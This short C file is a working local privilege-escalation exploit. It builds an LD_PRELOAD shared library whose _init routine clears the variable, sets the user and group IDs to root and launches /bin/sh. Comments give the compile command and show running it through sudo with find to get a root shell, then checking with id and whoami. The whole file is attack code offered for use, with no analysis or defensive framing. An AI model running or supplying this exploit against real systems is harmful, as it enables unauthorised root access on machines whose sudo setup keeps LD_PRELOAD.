#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

//usage
// gcc -fPIC -shared -o shell.so shell.c -nostartfiles
// ls -al shell.so
// sudo LD_PRELOAD=/tmp/shell.so find
// id
// whoami 

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
